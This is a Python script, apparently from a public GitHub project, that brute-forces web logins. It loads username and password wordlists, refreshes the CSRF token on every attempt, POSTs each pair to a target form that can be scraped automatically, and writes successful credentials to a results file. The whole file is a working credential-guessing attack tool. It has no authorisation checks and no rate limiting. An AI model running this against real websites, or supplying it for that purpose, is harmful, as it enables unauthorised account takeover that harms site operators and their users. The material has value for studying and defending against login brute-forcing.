######################################################################################################
# Title: BRUTE FORCE TOOL                                                                            #
# Author: DIVAS A S                                                                                  #
# Github : https://github.com/d1v45                                                                  #                                                     
######################################################################################################

import requests
from lxml import html
from sys import exit
import logging

# Configure logging
logging.basicConfig(filename='bruteforce.log', level=logging.INFO, 
                    format='%(asctime)s:%(levelname)s:%(message)s')

def presentation():
    """
    This method just presents the app and asks for a choice before starting.
    """
    message = ('''
\t     ▒░█▀▀▄ █▀▀█ ▄  ▄ ▀▀█▀▀ █▀▀▀  █▀▀▀ █▀▀█ █▀▀█ █▀▀▀ ▄░░▄     
\t     ▒░█▄▄▀░█▄▄▀ █░░█  ░█   █▀▀░  █▄▄▄ █░░█ █▄▄▀ █░░  █▄▄ 
\t     ▒░█▄▄▀ ▀░░█ █▄▄█  ░█   ▀░░▀  █░░  ▀▀▀▀ ▀░░█ ▀▀▀▀ █▄▄▄'''
        "\n\n[+] Select a mode for detecting fields:\n"
        "[+] 1-) Automatic mode (Will get all necessary fields and proceed)\n"
        "[+] 2-) Manual mode (You will provide necessary information before continuing)\n"
        "[+] -\n"
        "[+] 0-) Stop the program"
    )
    print(message)
    logging.info(message)
    
def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]

INCORRECT_MESSAGE = open_ressources(r".\txtfile\ErrorMessage.txt")
SUCCESS_MESSAGE = open_ressources(r".\txtfile\SuccessMessage.txt")
PASSWORDS = open_ressources(r".\txtfile\passwords.txt")
USERS = open_ressources(r".\txtfile\Users.txt")
LIMIT_TRYING_ACCESSING_URL = 7

def process_request(request, user, password, failed_aftertry):
    if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
        if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
            message = "[+] Connection failed: Trying again ...."
            print(message)
            logging.info(message)
            return
        else:
            failed_aftertry += 1
            message = "[+] Connection failed: 404 Not Found (Verify your URL)"
            print(message)
            logging.error(message)
    else:
        if INCORRECT_MESSAGE[0] in request.text or INCORRECT_MESSAGE[1] in request.text:
            message = f"[+] Failed to connect with user: {user} and password: {password}"
            print(message)
            logging.info(message)
        else:
            if SUCCESS_MESSAGE[0] in request.text or SUCCESS_MESSAGE[1] in request.text:
                result = (
                    "\n[+] --------------------------------------------------------------"
                    f"\n[+] Yeah!! These Credentials succeeded to Log In:"
                    f"\n> username: {user} and password: {password}"
                    "\n[+] --------------------------------------------------------------\n"
                )
                with open("./results.txt", "w+") as frr:
                    frr.write(result)
                message = f"[+] A Match succeeded 'user: {user} and password: {password}' and has been saved at ./results.txt"
                print(result)
                logging.info(message)
                exit()
            else:
                message = f"Trying these parameters: user: {user} and password: {password}"
                print(message)
                logging.info(message)

def get_csrf_token(url, csrf_field):
    message = f"[+] Connecting to {url}"
    print(message)
    logging.info(message)
    try:
        result = requests.get(url)
        tree = html.fromstring(result.text)
        message = "[+] Trying to Fetch a token.."
        print(message)
        logging.info(message)
        _token = ""
        try:
            _token = list(set(tree.xpath(f"//input[@name='{csrf_field}']/@value")))[0]
        except Exception as e:
            error_message = f"Failed to fetch CSRF token: {e}"
            print(error_message)
            logging.error(error_message)
        return _token
    except requests.RequestException as e:
        error_message = f"Failed to connect to {url}: {e}"
        print(error_message)
        logging.error(error_message)
        return ""

def process_user(user, url, failed_aftertry, user_field, password_field, csrf_field="_csrf"):
    for password in PASSWORDS:
        payload = {
            user_field: user.strip(),
            password_field: password.strip(),
            csrf_field: get_csrf_token(url, csrf_field)
        }
        message = f"[+] Payload: {payload}"
        print(message)
        logging.info(message)
        try:
            request = requests.post(url, data=payload)
            process_request(request, user, password, failed_aftertry)
        except requests.RequestException as e:
            error_message = f"Failed to process user {user} with password {password}: {e}"
            print(error_message)
            logging.error(error_message)

def try_connection(url, user_field, password_field, csrf_field):
    message = f"[+] Connecting to: {url}......"
    print(message)
    logging.info(message)
    failed_aftertry = 0
    for user in USERS:
        process_user(user, url, failed_aftertry, user_field, password_field, csrf_field)

def manual_mode():
    print("[+] Manual Mode selected ")
    logging.info("[+] Manual mode selected ")
    print("[+] After inspecting the LOGIN <form />, please fill here:")
    logging.info("[+] After inspecting the LOGIN <form />, please fill here:")

    url = input("\n[+] Enter the target URL (it's the 'action' attribute on the form tag):")
    user_field = input("\n[+] Enter the User Field (it's the 'name' attribute on the Login form for the username/email):")
    password_field = input("\n[+] Enter the Password Field (it's the 'name' attribute on the Login form for the password):")
    csrf_field = input("\n[+] Enter the csrf-token field (it's the 'name' attribute on the Login form for the csrf, leave blank if this attribute is not present in the form):")

    try_connection(url, user_field, password_field, csrf_field)

def extract_field_form(url, html_contain):
    message = "[+] Starting extraction..."
    print(message)
    logging.info(message)
    tree = html.fromstring(html_contain)
    message = "[+] Fetching parameters.."
    print(message)
    logging.info(message)

    form_action_url = list(tree.xpath("//form/@action"))[0] if tree.xpath("//form/@action") else url
    payload_fetched = list(set(tree.xpath("//form//input")))

    if "http" not in form_action_url:
        form_action_url = url + form_action_url

    message = f"[++] > action: {form_action_url}"
    print(message)
    logging.info(message)
    fields = []
    for each_element in payload_fetched:
        names = each_element.xpath("//@name")
        types = each_element.xpath("//@type")

        for i, name in enumerate(names):
            if types[i] != "submit" and name != "submit":
                message = f"[++] > {name} {{{types[i]}}}"
                print(message)
                logging.info(message)
        fields = names
        break

    if len(fields) == 2:
        fields.append("empty-token-field")

    try_connection(url, fields[0], fields[1], fields[2])

def automatic_mode():
    message = "[+] Starting the automatic mode..."
    print(message)
    logging.info(message)
    url = input("\n[+] Enter the URL of the website and let me do the rest: ")
    try:
        r = requests.get(url)
        extract_field_form(url, r.text)
    except requests.RequestException as e:
        error_message = f"Failed to connect to {url}: {e}"
        print(error_message)
        logging.error(error_message)

def main():
    presentation()
    try:
        mode = int(input("[+] Choice: "))
        if mode == 1:
            automatic_mode()
        elif mode == 2:
            manual_mode()
        elif mode == 0:
            exit()
        else:
            main()
    except ValueError as e:
        error_message = f"Invalid input: {e}"
        print(error_message)
        logging.error(error_message)
        main()

if __name__ == '__main__':
    main()
